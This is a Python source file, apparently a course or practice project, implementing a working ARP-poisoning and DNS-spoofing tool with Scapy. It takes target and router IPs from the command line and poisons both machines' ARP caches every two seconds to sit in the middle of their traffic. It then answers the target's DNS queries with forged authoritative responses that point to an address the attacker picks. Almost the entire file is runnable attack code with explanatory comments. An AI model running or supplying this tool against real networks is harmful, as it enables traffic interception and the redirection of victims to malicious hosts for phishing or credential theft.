'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    dnsSpoof.py
--
--  PROGRAM:        ARP poisons the target machine in order to start a man-in-the-middle
--                  attack and then crafting a spoofed DNS response in order to 
--                  redirect the domain name request of the target machine.
--
--  FUNCTIONS:      getMAC(IP),
--                  arpPoison(),
--                  dnsSniff(),
--                  packetExtract(packet),
--                  main().
--
--  DATE:           October 26, 2015
--
--  REVISIONS:      November 4, 2015
--
--  NOTES:
--  The program requires "Scapy", and argparse, APIs as well as root
--  user privilege in order to work properly.
--  http://www.secdev.org/projects/scapy/
--  https://docs.python.org/dev/library/argparse.html
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#!usr/bin/python
from scapy.all import *
import argparse
import threading
import time

#Set command line arguments for the program.
cmdParser = argparse.ArgumentParser(description="ARP Poison & DNS Spoofer Program")
cmdParser.add_argument('-t'
                    ,'--target'
                    ,dest='targetIP'
                    ,help='IP address of the target machine. Ex: -t 192.168.0.1'
                    ,required=True)
cmdParser.add_argument('-r'
                    ,'--router'
                    ,dest='routerIP'
                    ,help='IP address of the router. Ex: -r 192.168.0.100'
                    ,required=True)
cmdParser.add_argument('-d'
                    ,'--dns'
                    ,dest='dnsAddr'
                    ,help='IP address you would like the DNS spoofer to redirect to. Ex: -d 8.8.8.8'
                    ,required=True)
args = cmdParser.parse_args()

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       getMAC
--  Parameters:
--      ip
--          The IPv4 Address.
--  Return Values:
--      HardwareAddress
--          The MAC address associated with the parse IP address
--  Description:
--      Function to get and return the MAC address of the specified IP address.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def getMAC(ip):
    #Send and receive an ARP request and response for the specified IP.
    packet, errPacket = sr(ARP(pdst=ip), verbose=0)
    #Get the item in the second (after comma separation)
    for one, two in packet:
        return two[ARP].hwsrc

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       arpPoison
--  Parameters:
--      None
--  Return Values:
--      None
--  Description:
--      Function to ARP poison the target machine and router in order to conduct the
--      man in the middle attack. Sends ARP response packets to both target machine 
--      and router every 2 seconds telling them that we are the other. (From target's
--      machine we look like the router and vice versa for the router.)
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def arpPoison():
    routerMac = getMAC(args.routerIP)
    targetMac = getMAC(args.targetIP)
    print "Now ARP poisoning target machine: %s and router: %s ..." % (args.targetIP, args.routerIP)
    while True:
        #Resend the ARP response packets every 2 seconds
        time.sleep(2)
        #op=2 indicates it's a ARP response packet (opposed to a request)
        #sendp function is used since we are crafting an ARP packet that deals with
        #layer 2 protocol rather than layer 3 (IP)
        #Don't need to specify our source MAC address, since scapy will fill it
        #out by default with the current machine's values if we don't specify it.
        sendp((Ether(dst=targetMac)/ARP(op=2, hwdst=targetMac, pdst=args.targetIP, psrc=args.routerIP)),verbose=0)
        sendp(Ether(dst=routerMac)/ARP(op=2, hwdst=routerMac, pdst=args.routerIP, psrc=args.targetIP), verbose=0)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       dnsSniff
--  Parameters:
--      None
--  Return Values:
--      None
--  Description:
--      Function to parse the packet object from the scapy sniff of the network
--      traffic of the target machine and filter it for any DNS packets.
--      If a DNS packet is found, it will execute the packet extract function.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def dnsSniff():
    #Filter to ensure it only captures the target machine's DNS traffic
    filterDNS = "udp and port 53 and ip src %s" %args.targetIP
    sniff(filter=filterDNS, prn=packetExtract)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       packetExtract
--  Parameters:
--      packet
--          The packet object that is sniffed with scapy.
--  Return Values:
--      None
--  Description:
--      Function to ensure the the packet we sniffed is the right one by the filter.
--      It checks to make sure it is a DNS request from the target machine. The 
--      program will then craft a spoofed DNS response packet that will send the 
--      requested domain to our own specified IP address.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def packetExtract(packet):
    #If you wanted to check on the Ethernet layer for a DNS packet - type: 2048
    if packet.haslayer(DNS):
        if packet[DNS].qr == 0:
            #DNS field qr = 1 indicates it's a DNS response
            #DNS field aa = 1 indicates it the response is definitive. (Authoritative Answer)
            dnsResponse = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                        UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                        DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1,\
                        #DNSRR = DNS Resource Record (vs DNQR, Question Record)
                        #Copy the DNS requests' DNS info to the response.
                        an=DNSRR(rrname=packet[DNS].qd.qname,ttl=10, rdata=args.dnsAddr))
            send(dnsResponse, verbose=0)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       main
--  Parameters:
--      None
--  Return Values:
--      None
--  Description:
--      Main function to create and start multi threading, as a result starting
--      the ARP poison thread and the DNS spoofing thread.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def main():
    #Executes ARP poison in a separate thread
    arpThread = threading.Thread(target=arpPoison)
    arpThread.daemon = True
    arpThread.start()

    #Spoof DNS traffic from target machine.
    dnsThread = threading.Thread(target=dnsSniff)
    dnsThread.daemon = True
    dnsThread.start()
    
    # main thread
    while True:
    	time.sleep(1)

if __name__ == '__main__':
	main()